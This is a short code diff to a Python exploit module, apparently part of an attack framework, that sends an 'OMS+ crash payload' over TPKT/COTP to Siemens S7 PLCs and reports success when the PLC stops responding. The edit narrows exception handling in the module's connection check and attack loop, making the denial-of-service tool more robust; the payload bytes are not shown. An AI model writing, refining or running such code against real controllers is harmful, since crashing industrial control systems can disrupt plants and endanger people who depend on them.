@@ -81,7 +81,7 @@ class Exploit(Exploit):
             resp = s.recv(22)
             s.close()
             return len(resp) >= 4 and resp[5:6] == b"\xd0"  # COTP CC (connection confirm)
-        except Exception:
+        except (ConnectionError, TimeoutError, OSError):
             return False
 
     def run(self):
@@ -133,7 +133,7 @@ class Exploit(Exploit):
                 time.sleep(0.3)
                 try:
                     s.recv(64)
-                except Exception:
+                except OSError:
                     pass
 
                 # Send OMS+ crash payload wrapped in TPKT/COTP DT
@@ -155,5 +155,5 @@ class Exploit(Exploit):
                 except TimeoutError:
                     print_success(f"[S7Plus-Crash v{v}] Timeout - PLC unresponsive!")
 
-            except Exception as e:
+            except (ConnectionError, TimeoutError, OSError, struct.error) as e:
                 print_error(f"[S7Plus-Crash v{v}] {e}")
